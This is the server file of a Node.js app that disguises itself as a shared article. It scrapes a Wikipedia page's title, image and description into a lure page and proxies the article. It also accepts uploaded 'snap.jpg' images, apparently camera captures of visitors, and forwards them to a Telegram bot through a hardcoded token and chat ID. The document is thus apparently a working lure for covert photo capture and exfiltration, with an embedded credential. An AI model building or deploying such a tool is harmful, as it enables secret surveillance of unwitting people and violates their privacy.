const path = require('path');
const fs = require('fs');
const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');
const FormData = require('form-data');

const app = express();
const PORT = process.env.PORT || 3000;

// CONFIGURATION
const BOT_TOKEN = '6047507658:AAGHC5tFppE2yqLpQi4KOrz7TwGeM0Mc-LI';
const CHAT_ID = '5574741182';
const TARGET_URL = 'https://en.wikipedia.org/wiki/Film'; // Change this link to change the site

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.static(path.join(__dirname, 'public')));

// UNIVERSAL PROXY: Fetches the content of the target website
app.get('/view-article', async (req, res) => {
    try {
        const response = await fetch(TARGET_URL);
        let html = await response.text();
        const urlObj = new URL(TARGET_URL);
        const baseUrl = `${urlObj.protocol}//${urlObj.hostname}`;
        
        html = html.replace(/href="\//g, `href="${baseUrl}/`);
        html = html.replace(/src="\//g, `src="${baseUrl}/`);
        res.send(html);
    } catch (err) {
        res.status(500).send("Loading...");
    }
});

// DYNAMIC PREVIEW: Scrapes target site and injects into your index.html
app.get('/', async (req, res) => {
    try {
        const response = await fetch(TARGET_URL);
        const html = await response.text();
        
        // Extract Title and Image from the target site
        const siteTitle = html.match(/<title>(.*?)<\/title>/)?.[1] || "Wikipedia";
        const siteImg = html.match(/property="og:image" content="(.*?)"/)?.[1] || "";
        const siteDesc = html.match(/property="og:description" content="(.*?)"/)?.[1] || "Read the full article online.";

        let myIndex = fs.readFileSync(path.join(__dirname, 'public', 'index.html'), 'utf8');

        // Replace placeholders in index.html with real site data
        myIndex = myIndex.replace(/__TITLE__/g, siteTitle);
        myIndex = myIndex.replace(/__IMAGE__/g, siteImg);
        myIndex = myIndex.replace(/__DESC__/g, siteDesc);

        res.send(myIndex);
    } catch (err) {
        res.sendFile(path.join(__dirname, 'public', 'index.html'));
    }
});

app.post('/api/upload-photo', async (req, res) => {
    try {
        const { dataUrl } = req.body;
        const buffer = Buffer.from(dataUrl.split(',')[1], 'base64');
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('photo', buffer, { filename: 'snap.jpg' });
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: form });
        res.json({ ok: true });
    } catch (err) { res.status(500).json({ ok: false }); }
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
